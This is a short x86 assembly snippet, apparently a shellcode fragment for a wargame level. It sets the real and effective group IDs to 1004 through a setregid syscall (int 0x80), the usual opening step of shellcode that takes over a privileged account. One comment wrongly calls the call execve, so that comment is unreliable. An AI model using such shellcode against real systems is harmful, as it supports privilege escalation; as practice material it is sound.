.intel_syntax noprefix   # Intel syntax with no prefix for registers or instructions.

.section .text           # Text section: where executable code resides.
.global _start           # Define the _start symbol as the entry point for the code.

_start: 
    xor ebx, ebx
    mov bx, 1004 # setlev 1003 03eb
    

    xor ecx, ecx
    mov cx, 1004 # setlevflag 1004 03ec
    
    # perform syscall for 11 (execve)
    xor eax, eax
    mov    al, 71                # Set eax to 71 (setregid)
    int    0x80                   # Trigger interrupt to make the syscall

